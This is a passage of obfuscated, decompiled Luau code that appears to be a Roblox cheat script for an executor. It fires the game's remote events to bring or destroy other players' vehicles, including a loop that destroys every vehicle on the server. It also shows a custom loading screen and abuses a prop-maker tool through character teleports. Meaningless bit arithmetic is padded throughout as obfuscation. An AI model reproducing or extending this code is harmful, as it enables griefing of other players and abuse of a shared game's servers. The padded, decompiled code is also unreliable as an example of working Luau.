	local v = upv3.Vehicles:FindFirstChild(upv1)

	if v then
		upv4(v, "bring")
	end
end

-- payload closure created 469-th (proto #317)
local function payload_fn_469()
	if not upv1 then
		upv2("Aviso", "Selecione um veiculo primeiro.")
		return
	end
	local v = upv3.Vehicles:FindFirstChild(upv1)

	if v then
		upv4(v, "destroy")
	end
end

-- payload closure created 470-th (proto #318)
local function payload_fn_470(arg)
	local n2 = 3223405433
	local n3 = 896585580

	if arg then
		if not upv1 then
			upv2("Aviso", "Selecione um veiculo primeiro.")
			return false
		end
		local primaryPart = upv3.Vehicles:FindFirstChild(upv1)

		if primaryPart then
			primaryPart = primaryPart.PrimaryPart or primaryPart:FindFirstChildWhichIsA("BasePart", true)
		end

		if not primaryPart then
			upv2("Erro", "Falha ao focar a camera no carro.")
			return false
		end

		local v = upv4
		local v2 = bit32.bor(n2, 3694259169)
		v.Subject = upv3.CurrentCamera.CameraSubject
		upv4.Type = upv3.CurrentCamera.CameraType
		upv3.CurrentCamera.CameraSubject = primaryPart
		upv3.CurrentCamera.CameraType = Enum.CameraType.Follow
	elseif upv4.Subject then
		upv3.CurrentCamera.CameraSubject = upv4.Subject
		upv3.CurrentCamera.CameraType = upv4.Type
		upv4 = {}
	end
end

-- payload closure created 471-th (proto #319)
local function payload_fn_471()
	local n2 = 183764025
	local flag = type(183764025) == "vector"
	local v = upv1()
	if v[1]:find("Nenhum carro") then
		upv2("Aviso", "Nenhum veiculo registrado no servidor.")
		return
	end
	local v2 = task
	local v3 = bit32.bxor(n2, 63046936)
	local v4 = table.pack(bit32.band(v3, 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local n3 = bit32.band(1467 * v5[1] + bit32.lshift(bit32.band(1467 * bit32.rshift(v4[1], 16) + 60900 * v5[1], 65535), 16), 4294967295) + 1864893327
	local v6 = table.pack(bit32.band(bit32.bor(v3, 499814973), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local v8 = bit32.band(64070 * v7[1] + bit32.lshift(bit32.band(64070 * bit32.rshift(v6[1], 16) + 4635 * v7[1], 65535), 16), 4294967295)
	local v9 = table.pack(bit32.band(bit32.band(v3, 499814973), 4294967295))
	local v10 = table.pack(bit32.band(v9[1], 65535))
	local n4 = n3 + v8 + bit32.band(64068 * v10[1] + bit32.lshift(bit32.band(64068 * bit32.rshift(v9[1], 16) + 4635 * v10[1], 65535), 16), 4294967295)

	v2.spawn(function()
		for _, v11 in ipairs(v) do
			local v12 = upv3.Vehicles:FindFirstChild(v11)

			if v12 then
				upv4(v12, "bring")
				task.wait(1.5)
			end
		end
	end)
end

-- payload closure created 472-th (proto #320)
local function payload_fn_472(arg)
	upv1 = arg

	if arg then
		local n2 = 8930457040

		task.spawn(function()
			while upv1 do
				local v = upv2()

				if not v[1]:find("Nenhum carro") then
					for _, v2 in ipairs(v) do
						if upv1 then
							local v3 = upv3.Vehicles:FindFirstChild(v2)

							if v3 then
								upv4(v3, "destroy")
								task.wait(1.5)
							end

							continue
						end

						break
					end
				end

				task.wait(5)
			end
		end)
	end
end

-- payload closure created 474-th (proto #762)
local function payload_fn_474()
	task.wait(1)
	upv1(not upv2)
end

-- payload closure created 475-th (proto #325)
local function payload_fn_475(arg, arg2)
	local n2 = 398048572
	local n3 = 198836001
	local n4 = 491134562
	local n5 = 413745941
	if getgenv()._Running then
		return
	end
	local tbl = {}
	local a = {}
	local v = bit32.bxor(n5, 0)
	local v2 = bit32.bxor(n3, v)
	a[1] = "01110"
	a[2] = "10001"
	a[3] = "10001"
	a[4] = "11111"
	a[5] = "10001"
	a[6] = "10001"
	a[7] = "10001"
	tbl.A = a
	local b = {}
	local v3 = table.pack(bit32.band(n4, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n6 = 243542963 + bit32.band(41316 * v4[1] + bit32.lshift(bit32.band(41316 * bit32.rshift(v3[1], 16) + 34361 * v4[1], 65535), 16), 4294967295)
	local v5 = table.pack(bit32.band(v, 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(41315 * v6[1] + bit32.lshift(bit32.band(41315 * bit32.rshift(v5[1], 16) + 34361 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bor(n4, v), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local v10 = bit32.band(48442 * v9[1] + bit32.lshift(bit32.band(48442 * bit32.rshift(v8[1], 16) + 62348 * v9[1], 65535), 16), 4294967295)
	local v11 = table.pack(bit32.band(bit32.bxor(v, n4), 4294967295))
	local v12 = table.pack(bit32.band(v11[1], 65535))
	local n7 = n6 + v7 + v10 + bit32.band(41315 * v12[1] + bit32.lshift(bit32.band(41315 * bit32.rshift(v11[1], 16) + 34361 * v12[1], 65535), 16), 4294967295)
	local n8 = n5 + 268232693
	b[1] = "11110"
	b[2] = "10001"
	b[3] = "10001"
	b[4] = "11110"
	b[5] = "10001"
	b[6] = "10001"
	b[7] = "11110"
	tbl.B = b
	local c = {}
	local v13 = bit32.bxor(n8, 0)
	c[1] = "01110"
	c[2] = "10001"
	c[3] = "10000"
	c[4] = "10000"
	c[5] = "10000"
	c[6] = "10001"
	c[7] = "01110"
	tbl.C = c
	tbl.D = { "11110", "10001", "10001", "10001", "10001", "10001", "11110" }
	tbl.E = { "11111", "10000", "10000", "11110", "10000", "10000", "11111" }
	tbl.F = { "11111", "10000", "10000", "11110", "10000", "10000", "10000" }
	local v14 = table.pack(bit32.band(v13, 4294967295))
	local v15 = table.pack(bit32.band(v14[1], 65535))
	local v16 = bit32.band(2629 * v15[1] + bit32.lshift(bit32.band(2629 * bit32.rshift(v14[1], 16) + 59870 * v15[1], 65535), 16), 4294967295)
	local v17 = table.pack(bit32.band(bit32.bnot(v13), 4294967295))
	local v18 = table.pack(bit32.band(v17[1], 65535))
	local n9 = 3722480696 + n7 - 1997857 + v16 + bit32.band(2629 * v18[1] + bit32.lshift(bit32.band(2629 * bit32.rshift(v17[1], 16) + 59870 * v18[1], 65535), 16), 4294967295)
	local v19 = bit32.rshift(v2, 9)
	tbl.G = { "01110", "10001", "10000", "10111", "10001", "10001", "01110" }
	tbl.H = { "10001", "10001", "10001", "11111", "10001", "10001", "10001" }
	local i = {}
	local v20 = bit32.band(n2 + v13, 3039724941)
	local n10 = n8 - 70200
	i[1] = "111"
	i[2] = "010"
	i[3] = "010"
	i[4] = "010"
	i[5] = "010"
	i[6] = "010"
	i[7] = "111"
	tbl.I = i
	tbl.J = { "00111", "00010", "00010", "00010", "10010", "10010", "01100" }
	tbl.K = { "10001", "10010", "10100", "11000", "10100", "10010", "10001" }
	tbl.L = { "10000", "10000", "10000", "10000", "10000", "10000", "11111" }
	local n11 = n9 + 116587414 - 36535097 + 104594381
	local n12 = v19 - bit32.bxor(n10, 0)
	tbl.M = { "10001", "11011", "10101", "10101", "10001", "10001", "10001" }
	tbl.N = { "10001", "11001", "10101", "10011", "10001", "10001", "10001" }
	local o = {}
	local v21 = bit32.bor(v20, 4286961367)
	o[1] = "01110"
	o[2] = "10001"
	o[3] = "10001"
	o[4] = "10001"
	o[5] = "10001"
	o[6] = "10001"
	o[7] = "01110"
	tbl.O = o
	tbl.P = { "11110", "10001", "10001", "11110", "10000", "10000", "10000" }
	local q = {}
	local v22 = bit32.rshift(v21, 19)
	q[1] = "01110"
	q[2] = "10001"
	q[3] = "10001"
	q[4] = "10001"
	q[5] = "10101"
	q[6] = "10010"
	q[7] = "01101"
	tbl.Q = q
	tbl.R = { "11110", "10001", "10001", "11110", "10100", "10010", "10001" }
	tbl.S = { "01111", "10000", "10000", "01110", "00001", "00001", "11110" }
	local n13 = n10 + 208243778 - 348604814
	tbl.T = { "11111", "00100", "00100", "00100", "00100", "00100", "00100" }
	tbl.U = { "10001", "10001", "10001", "10001", "10001", "10001", "01110" }
	local n14 = (n12 + v22) // v22
	tbl.V = { "10001", "10001", "10001", "10001", "10001", "01010", "00100" }
	tbl.W = { "10001", "10001", "10001", "10101", "10101", "11011", "10001" }
	tbl.X = { "10001", "01010", "00100", "00100", "01010", "10001", "10001" }
	tbl.Y = { "10001", "10001", "10001", "01010", "00100", "00100", "00100" }
	tbl.Z = { "11111", "00001", "00010", "00100", "01000", "10000", "11111" }
	tbl["0"] = { "01110", "10001", "10011", "10101", "11001", "10001", "01110" }
	tbl["1"] = { "00100", "01100", "00100", "00100", "00100", "00100", "01110" }
	tbl["2"] = { "01110", "10001", "00001", "00010", "00100", "01000", "11111" }
	tbl["3"] = { "11111", "00010", "00100", "00010", "00001", "10001", "01110" }
	tbl["4"] = { "00010", "00110", "01010", "10010", "11111", "00010", "00010" }
	local n15 = n13 + 170955385 + 201303310
	local n16 = v22 * n14 // n14
	tbl["5"] = { "11111", "10000", "11110", "00001", "00001", "10001", "01110" }
	tbl["6"] = { "00110", "01000", "10000", "11110", "10001", "10001", "01110" }
	local tbl2 = {}
	local v23 = bit32.bxor(n15, 0)
	local v24 = bit32.band(n14, v23)
	tbl2[1] = "11111"
	tbl2[2] = "00001"
	tbl2[3] = "00010"
	tbl2[4] = "00100"
	tbl2[5] = "01000"
	tbl2[6] = "10000"
	tbl2[7] = "10000"
	tbl["7"] = tbl2
	tbl["8"] = { "01110", "10001", "10001", "01110", "10001", "10001", "01110" }
	local n17 = n15 - 244012244
	tbl["9"] = { "01110", "10001", "10001", "01111", "00001", "00010", "01100" }
	tbl[" "] = { "00000", "00000", "00000", "00000", "00000", "00000", "00000" }
	local n18 = v24 - bit32.bxor(n17, 0)
	tbl["!"] = { "00100", "00100", "00100", "00100", "00100", "00000", "00100" }
	tbl["?"] = { "01110", "10001", "00001", "00010", "00100", "00000", "00100" }
	tbl["."] = { "00000", "00000", "00000", "00000", "00000", "00110", "00110" }
	local v25 = table.pack(bit32.band(n16, 4294967295))
	local v26 = table.pack(bit32.band(n18, 4294967295))
	local v27 = table.pack(bit32.band(v25[1], 65535))
	local v28 = table.pack(bit32.rshift(v25[1], 16))
	local v29 = table.pack(bit32.band(v26[1], 65535))
	local v30 = bit32.band(v27[1] * v29[1] + bit32.lshift(bit32.band(v27[1] * bit32.rshift(v26[1], 16) + v28[1] * v29[1], 65535), 16), 4294967295)
	tbl[","] = { "00000", "00000", "00000", "00000", "00000", "00100", "01000" }
	tbl[":"] = { "00000", "00110", "00110", "00000", "00110", "00110", "00000" }
	tbl[";"] = { "00000", "00110", "00110", "00000", "00100", "01000", "00000" }
	tbl["-"] = { "00000", "00000", "00000", "11111", "00000", "00000", "00000" }
	tbl["+"] = { "00000", "00100", "00100", "11111", "00100", "00100", "00000" }
	tbl["="] = { "00000", "11111", "00000", "11111", "00000", "00000", "00000" }
	local tbl3 = {}
	local v31 = bit32.lshift(n18, 31)
	tbl3[1] = "00001"
	tbl3[2] = "00010"
	tbl3[3] = "00100"
	tbl3[4] = "01000"
	tbl3[5] = "10000"
	tbl3[6] = "00000"
	tbl3[7] = "00000"
	tbl["/"] = tbl3
	local v32 = bit32.bxor(v30, 4294967295)
	tbl["("] = { "00010", "00100", "01000", "01000", "01000", "00100", "00010" }
	tbl[")"] = { "01000", "00100", "00010", "00010", "00010", "00100", "01000" }
	tbl["*"] = { "00000", "00100", "10101", "01110", "10101", "00100", "00000" }
	local tbl4 = {}
	local n19 = n17 + 177005538 - 161244911
	local v33 = table.pack(bit32.band(n19, 4294967295))
	local v34 = table.pack(bit32.band(v33[1], 65535))
	local v35 = bit32.band(13337 * v34[1] + bit32.lshift(bit32.band(13337 * bit32.rshift(v33[1], 16) + 57832 * v34[1], 65535), 16), 4294967295)
	local v36 = table.pack(bit32.band(bit32.bnot(n19), 4294967295))
	local v37 = table.pack(bit32.band(v36[1], 65535))
	local n20 = 3652836869 + n11 - 153387436 + 115961863 + 202559800 - 284975591 + 348101157 - 69184219 - 367585038 + 396435775 - 50298697 - 123410292 + v35 + bit32.band(13337 * v37[1] + bit32.lshift(bit32.band(13337 * bit32.rshift(v36[1], 16) + 57832 * v37[1], 65535), 16), 4294967295)
	tbl4[1] = "11001"
	tbl4[2] = "11010"
	tbl4[3] = "00100"
	tbl4[4] = "01000"
	tbl4[5] = "10110"
	tbl4[6] = "10011"
	tbl4[7] = "00000"
	tbl["%"] = tbl4
	tbl["@"] = { "01110", "10001", "10011", "10101", "10111", "10000", "01110" }
	local n21 = v31 // v32 * v32
	tbl["#"] = { "01010", "01010", "11111", "01010", "11111", "01010", "01010" }
	tbl["$"] = { "00100", "01111", "10100", "01110", "00101", "11110", "00100" }
	local tbl5 = {}
	local v38 = bit32.bxor(n19, 0)
	local v39 = table.pack(bit32.band(v32, 4294967295))
	local v40 = table.pack(bit32.band(v38, 4294967295))
	local v41 = table.pack(bit32.band(v39[1], 65535))
	local v42 = table.pack(bit32.rshift(v39[1], 16))
	local v43 = table.pack(bit32.band(v40[1], 65535))
	local v44 = bit32.band(v41[1] * v43[1] + bit32.lshift(bit32.band(v41[1] * bit32.rshift(v40[1], 16) + v42[1] * v43[1], 65535), 16), 4294967295)
	tbl5[1] = "01100"
	tbl5[2] = "10010"
	tbl5[3] = "10100"
	tbl5[4] = "01000"
	tbl5[5] = "10101"
	tbl5[6] = "10010"
	tbl5[7] = "01101"
	tbl["&"] = tbl5
	local n22 = n19 + 169976801
	local v45 = n22
	local tbl6 = {}
	local v46 = table.pack(bit32.band(n20, 4294967295))
	local v47 = table.pack(bit32.band(v46[1], 65535))
	local n23 = 3804933928 + bit32.band(12977 * v47[1] + bit32.lshift(bit32.band(12977 * bit32.rshift(v46[1], 16) + 16631 * v47[1], 65535), 16), 4294967295)
	local v48 = table.pack(bit32.band(bit32.bnot(n20), 4294967295))
	local v49 = table.pack(bit32.band(v48[1], 65535))
	local v50 = bit32.band(12976 * v49[1] + bit32.lshift(bit32.band(12976 * bit32.rshift(v48[1], 16) + 16631 * v49[1], 65535), 16), 4294967295)
	local v51 = table.pack(bit32.band(n22, 4294967295))
	local v52 = table.pack(bit32.band(v51[1], 65535))
	local v53 = bit32.band(31425 * v52[1] + bit32.lshift(bit32.band(31425 * bit32.rshift(v51[1], 16) + 40408 * v52[1], 65535), 16), 4294967295)
	local v54 = table.pack(bit32.band(bit32.bnot(n22), 4294967295))
	local v55 = table.pack(bit32.band(v54[1], 65535))
	local n24 = n23 + v50 + v53 + bit32.band(31425 * v55[1] + bit32.lshift(bit32.band(31425 * bit32.rshift(v54[1], 16) + 40408 * v55[1], 65535), 16), 4294967295)
	tbl6[1] = "00100"
	tbl6[2] = "00100"
	tbl6[3] = "00000"
	tbl6[4] = "00000"
	tbl6[5] = "00000"
	tbl6[6] = "00000"
	tbl6[7] = "00000"
	tbl["'"] = tbl6
	tbl._ = { "00000", "00000", "00000", "00000", "00000", "00000", "11111" }

	local function fn(arg3, arg4, arg5)
		local n25 = 0

		for match in arg5:upper():gmatch(".") do
			local v56 = tbl[match]

			if v56 then
				for _, v57 in ipairs(v56) do
					n25 += v57:gsub("0", ""):len()
				end
			end
		end

		return n25
	end

	local v56 = fn(365175991, 212888700, arg)
	getgenv()._Running = true
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local CoreGui = game:GetService("CoreGui")
	local localPlayer = Players.LocalPlayer

	pcall(function()
		ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllProps")
	end)

	if CoreGui:FindFirstChild("LoadingUI") then
		return
	end

	for match in arg:upper():gmatch(".") do
		if not tbl[match] then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Error",
				Text = "Your custom word contains unsupported characters: '" .. match .. "'",
				Duration = 5,
			})

			getgenv()._Running = false
			return
		end
	end

	local screenGui = Instance.new("ScreenGui", CoreGui)
	screenGui.Name = "LoadingUI"
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 999999
	screenGui.ResetOnSpawn = false
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	local frame = Instance.new("Frame", screenGui)
	frame.Size = UDim2.new(1, 0, 1, 0)
	local n25 = v45 - 415464601 + 122245809
	frame.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
	frame.ZIndex = 1
	local uiGradient = Instance.new("UIGradient", frame)
	local colorSequence = ColorSequence.new
	local tbl7 = {}
	local new = ColorSequenceKeypoint.new
	local v57 = Color3
	local n26 = n21 + bit32.bxor(n25, 0)
	local v58 = new(0, v57.fromRGB(15, 5, 25))
	local v59 = ColorSequenceKeypoint.new(0.3, Color3.fromRGB(5, 5, 15))
	local v60 = ColorSequenceKeypoint.new(0.7, Color3.fromRGB(0, 0, 10))
	local v61 = ColorSequenceKeypoint
	local v62 = bit32.bxor(v44 // 40 // 7, 4294967295)
	local new2 = v61.new
	local color = Color3.fromRGB
	tbl7[1] = v58
	tbl7[2] = v59
	tbl7[3] = v60

	do
		local values = table.pack(new2(1, color(10, 5, 20)))
		table.move(values, 1, values.n, 4, tbl7)
	end

	uiGradient.Color = colorSequence(tbl7)
	uiGradient.Rotation = 135
	local new3 = Instance.new
	local Frame = new3("Frame", screenGui)
	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.BackgroundTransparency = 1
	local n27 = n25 - 43166386
	local n28 = n26 * 6
	Frame.ZIndex = 2

	local function createFrame(arg3, arg4, arg5, arg6, arg7, backgroundTransparency)
		local flag = bit32.bxor(n24, 0) == 90012577
		local frame2 = Instance.new("Frame", arg5)
		local udim2 = UDim2.new(0, arg6, 0, arg6)
		local v63 = table.pack(bit32.band(arg4, 4294967295))
		local v64 = table.pack(bit32.band(v63[1], 65535))
		local v65 = bit32.band(62948 * v64[1] + bit32.lshift(bit32.band(62948 * bit32.rshift(v63[1], 16) + 5026 * v64[1], 65535), 16), 4294967295)
		local v66 = table.pack(bit32.band(bit32.bnot(arg4), 4294967295))
		local v67 = table.pack(bit32.band(v66[1], 65535))
		local n29 = 969912906 + v65 + bit32.band(62948 * v67[1] + bit32.lshift(bit32.band(62948 * bit32.rshift(v66[1], 16) + 5026 * v67[1], 65535), 16), 4294967295)
		frame2.Size = udim2
		local n30 = n29 + 8241551
		frame2.Position = UDim2.new(math.random(), 0, math.random(), 0)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = backgroundTransparency
		frame2.BorderSizePixel = 0
		frame2.ZIndex = 3
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)

		task.spawn(function()
			while frame2.Parent do
				local n31 = frame2.Position.X.Scale - arg7

				if n31 < -0.1 then
					frame2.Position = UDim2.new(1.1, 0, math.random(), 0)
				else
					frame2.Position = UDim2.new(n31, 0, frame2.Position.Y.Scale, 0)
				end

				task.wait(0.05)
			end
		end)

		return frame2
	end

	for i2 = 1, 12 do
		createFrame(435733629, 403333500, Frame, math.random(2, 4), math.random(1, 3) * 0.001, 0.4)
	end

	local frame2 = Instance.new("Frame", screenGui)
	frame2.Size = UDim2.new(0, 160, 0, 160)
	frame2.Position = UDim2.new(0.5, -320, 0.5, -80)
	frame2.BackgroundColor3 = Color3.fromRGB(45, 45, 75)
	frame2.BackgroundTransparency = 0.3
	frame2.ZIndex = 5
	Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 15)
	local imageLabel = Instance.new("ImageLabel", frame2)
	imageLabel.Size = UDim2.new(1, -10, 1, -10)
	imageLabel.Position = UDim2.new(0, 5, 0, 5)
	imageLabel.BackgroundTransparency = 1
	imageLabel.ScaleType = Enum.ScaleType.Crop
	imageLabel.ZIndex = 6
	Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(0, 10)

	local tbl8 = {
		"rbxassetid://88090550906246",
		"rbxassetid://136756597059735",
		"rbxassetid://134222864932902",
		"rbxassetid://78200921955967",
		"rbxassetid://86076763934882",
		"rbxassetid://81128465781518",
		"rbxassetid://117679337552338",
		"rbxassetid://100354504916817",
		"rbxassetid://138778028588144",
		"rbxassetid://71473463280310",
		"rbxassetid://83924163418362",
		"rbxassetid://140072611536032",
	}

	local SoundService = game:GetService("SoundService")
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://89453893110578"
	local v63 = bit32.bxor(v62 + n28, 849958751)
	sound.Volume = 0.3
	sound.Looped = true
	sound.Parent = SoundService
	sound:Play()
	local n29 = 1

	task.spawn(function()
		while imageLabel.Parent do
			imageLabel.Image = tbl8[n29]
			n29 += 1

			if n29 > #tbl8 then
				n29 = 1
			end

			task.wait(0.15)
		end
	end)

	local flag = false
	local frame3 = Instance.new("Frame", screenGui)
	local n30 = v63 - 1322757564
	frame3.Size = UDim2.new(0, 400, 0, 220)
	frame3.Position = UDim2.new(0.5, -50, 0.5, -110)
	local n31 = n27 + 120778198 - 133301244 + 228548103
	frame3.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
	frame3.BackgroundTransparency = 0.05
	frame3.ZIndex = 10
	local new4 = Instance.new
	local v64 = bit32.bxor(n31, 0)
	local v65 = bit32.bxor(n28, v64)
	new4("UICorner", frame3).CornerRadius = UDim.new(0, 25)
	local frame4 = Instance.new("Frame", frame3)
	frame4.Size = UDim2.new(1, 0, 0, 50)
	frame4.Position = UDim2.new(0, 0, 0, 10)
	frame4.BackgroundTransparency = 1
	local v66 = bit32.bor(v65, n30)
	frame4.ZIndex = 12
	local textLabel = Instance.new("TextLabel", frame4)
	textLabel.Size = UDim2.new(1, 0, 0.69999998807907104, 0)
	textLabel.Text = "Coquette"
	local n32 = n31 + 211874133
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextSize = 28
	textLabel.TextColor3 = Color3.fromRGB(255, 150, 200)
	local v67 = bit32.bxor(n32, 0)
	local v68 = table.pack(bit32.band(n30, 4294967295))
	local v69 = table.pack(bit32.band(v67, 4294967295))
	local v70 = table.pack(bit32.band(v68[1], 65535))
	local v71 = table.pack(bit32.rshift(v68[1], 16))
	local v72 = table.pack(bit32.band(v69[1], 65535))
	local v73 = bit32.band(v70[1] * v72[1] + bit32.lshift(bit32.band(v70[1] * bit32.rshift(v69[1], 16) + v71[1] * v72[1], 65535), 16), 4294967295)
	textLabel.BackgroundTransparency = 1
	textLabel.ZIndex = 13
	local frame5 = Instance.new("Frame", frame3)
	frame5.Size = UDim2.new(1, -40, 0, 35)
	local v74 = bit32.bxor(n32, 0)
	local v75 = bit32.bxor(v66, v74)
	frame5.Position = UDim2.new(0, 20, 0, 105)
	frame5.BackgroundTransparency = 1
	frame5.ZIndex = 12
	local frame6 = Instance.new("Frame", frame5)
	frame6.Size = UDim2.new(1, 0, 0, 20)
	frame6.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
	frame6.ClipsDescendants = true
	local n33 = n32 - 526422167
	local v76 = table.pack(bit32.band(v73, 4294967295))
	local v77 = table.pack(bit32.band(v76[1], 65535))
	local v78 = bit32.band(v77[1] * 20137 + bit32.lshift(bit32.band(v77[1] * 0 + bit32.rshift(v76[1], 16) * 20137, 65535), 16), 4294967295)
	frame6.ZIndex = 13
	Instance.new("UICorner", frame6).CornerRadius = UDim.new(0, 12)
	local frame7 = Instance.new("Frame", frame6)
	frame7.Size = UDim2.new(0, 0, 1, 0)
	frame7.BackgroundColor3 = Color3.fromRGB(255, 150, 200)
	frame7.ZIndex = 14
	local uiCorner = Instance.new("UICorner", frame7)
	local v79 = bit32.bxor(n33, 0)
	local v80 = bit32.band(v78, v79)
	uiCorner.CornerRadius = UDim.new(0, 10)
	local textLabel2 = Instance.new("TextLabel", frame3)
	textLabel2.Size = UDim2.new(1, 0, 0, 20)
	textLabel2.Position = UDim2.new(0, 0, 0, 140)
	textLabel2.BackgroundTransparency = 1
	textLabel2.Font = Enum.Font.GothamBold
	textLabel2.TextSize = 16
	textLabel2.TextColor3 = Color3.new(1, 1, 1)
	textLabel2.Text = "Tools: 0"
	textLabel2.ZIndex = 5
	local textButton = Instance.new("TextButton", frame3)
	textButton.Size = UDim2.new(0, 120, 0, 35)
	textButton.Position = UDim2.new(0.5, -60, 0, 170)
	textButton.Text = "Cancelar"
	textButton.Font = Enum.Font.GothamBold
	textButton.TextSize = 14
	textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	textButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
	textButton.ZIndex = 15
	Instance.new("UICorner", textButton).CornerRadius = UDim.new(0, 8)

	textButton.MouseButton1Click:Connect(function()
		flag = true
	end)

	local function fn2()
		local n34 = 0

		for _, v81 in ipairs({ localPlayer.Backpack, localPlayer.Character }) do
			for _, child in ipairs(v81:GetChildren()) do
				if child:IsA("Tool") and child.Name == arg2 then
					n34 += 1
				end
			end
		end

		return n34
	end

	local v81 = arg
	local v82 = v56

	local function fn3(arg3, arg4)
		for i2 = 1, 100 do
			if not flag then
				frame7.Size = UDim2.new(i2 / 100, 0, 1, 0)
				local v83 = fn2(arg3, 482187767)
				local n34 = math.floor(v83 / v82 * 100)
				textLabel2.Text = string.format("Coletando: %d/%d (%d%%)", v83, v82, n34)
				task.wait(0.01)
				continue
			end

			break
		end

		if not flag then
			arg4(arg3, 499626564)
		else
			sound:Stop()
			sound:Destroy()
			screenGui:Destroy()
			getgenv()._Running = false
		end
	end

	local function fn4(arg3, arg4)
		local n34 = 447951188

		if arg4 + 413995319 == 285730199 then
			local v83 = table.pack(bit32.band(n34, 4294967295))
			local v84 = table.pack(bit32.band(v83[1], 65535))
			local n35 = bit32.band(30748 * v84[1] + bit32.lshift(bit32.band(30748 * bit32.rshift(v83[1], 16) + 2062 * v84[1], 65535), 16), 4294967295) + 1533939620
			local v85 = table.pack(bit32.band(bit32.bor(n34, 839406223), 4294967295))
			local v86 = table.pack(bit32.band(v85[1], 65535))
			local v87 = bit32.band(4040 * v86[1] + bit32.lshift(bit32.band(4040 * bit32.rshift(v85[1], 16) + 61411 * v86[1], 65535), 16), 4294967295)
			local v88 = table.pack(bit32.band(bit32.bxor(n34, 839406223), 4294967295))
			local v89 = table.pack(bit32.band(v88[1], 65535))
			local n36 = n35 + v87 + bit32.band(30749 * v89[1] + bit32.lshift(bit32.band(30749 * bit32.rshift(v88[1], 16) + 2062 * v89[1], 65535), 16), 4294967295)
		end

		local n35 = 942366802
		local v83 = table.pack(bit32.band(n34, 4294967295))
		local v84 = table.pack(bit32.band(v83[1], 65535))
		local n36 = bit32.band(13767 * v84[1] + bit32.lshift(bit32.band(13767 * bit32.rshift(v83[1], 16) + 1469 * v84[1], 65535), 16), 4294967295) + 2146701760
		local v85 = table.pack(bit32.band(bit32.band(n34, 262430784), 4294967295))
		local v86 = table.pack(bit32.band(v85[1], 65535))
		local v87 = bit32.band(38002 * v86[1] + bit32.lshift(bit32.band(38002 * bit32.rshift(v85[1], 16) + 62597 * v86[1], 65535), 16), 4294967295)
		local v88 = table.pack(bit32.band(bit32.bxor(n34, 262430784), 4294967295))
		local v89 = table.pack(bit32.band(v88[1], 65535))
		local n37 = n36 + v87 + bit32.band(51770 * v89[1] + bit32.lshift(bit32.band(51770 * bit32.rshift(v88[1], 16) + 64066 * v89[1], 65535), 16), 4294967295)
		local n38 = 2960186485
		local character = localPlayer.Character

		if not character then
			local v90 = localPlayer
			local v91 = bit32.bxor(n37, 154024445)
			character = v90.CharacterAdded:Wait()
			n37 = bit32.bxor(v91, 154024445)
		end

		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
		local position = humanoidRootPart.Position

		local function fn5(arg5, arg6)
			if arg6 then
				humanoidRootPart.CFrame = CFrame.new(arg6)
			end
		end

		local v90 = bit32.bxor(n37, 324306800)

		local function fn6(arg5, arg6, arg7)
			local flag2 = bit32.bxor(v90, 0) + 179103544 ~= 284212636
			local n39 = 506952235

			return {
				getPosition = function()
					return CFrame.new(-153.480377, 3, -43.405685)
				end,
				getClickDetector = function()
					local n40 = 128376681

					local ok2, result2 = pcall(function()
						local v91 = bit32.bxor(n40, 3033884100)
						local n41 = 3738258014
						local n42 = 402151301
						local n001TrafficCones = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")

						if n001TrafficCones then
							n001TrafficCones = n001TrafficCones:FindFirstChild("Prop" .. localPlayer.Name)
							n42 = n42 + 191857238 - 191857238
						end

						if n001TrafficCones and n001TrafficCones:FindFirstChild("Tools") and n001TrafficCones.Tools:FindFirstChild(arg7) then
							local clickDetector = n001TrafficCones.Tools[arg7]:FindFirstChild("ClickDetector")
							return clickDetector or n001TrafficCones.Tools[arg7]:FindFirstChildWhichIsA("ClickDetector")
						end

						if not localPlayer.Backpack:FindFirstChild("PropMaker") and not localPlayer.Character:FindFirstChild("PropMaker") then
							ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PropMaker")
							local wait = task.wait
							local v92 = bit32.bxor(n42, 0)
							local v93 = bit32.bor(v91, v92)
							wait(0.2)
							v91 = bit32.bxor(v93, 76039424)
						end

						ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(arg6))
						task.wait(0.2)
						local propMaker = localPlayer.Character:FindFirstChild("PropMaker")
						local propMaker2

						if propMaker then
							propMaker2 = propMaker
						else
							propMaker2 = localPlayer.Backpack:FindFirstChild("PropMaker")
							n42 = n42 + 534261620 - 534261620
						end

						if propMaker2 then
							local humanoid = localPlayer.Character:FindFirstChild("Humanoid")

							if humanoid then
								humanoid:EquipTool(propMaker2)
							end

							local n43 = 0.3
							task.wait(0.3)
							local model = workspace:FindFirstChild("Model")
							local v92 = bit32.band(v91, 2619416762)
							model = model and workspace.Model:FindFirstChild("Street") and workspace.Model.Street:FindFirstChild("Street") or workspace:FindFirstChild("Model") and (workspace.Model:FindFirstChildOfClass("Model") or workspace.Model:FindFirstChildOfClass("Part") or workspace.Model:GetChildren()[1])

							if model then
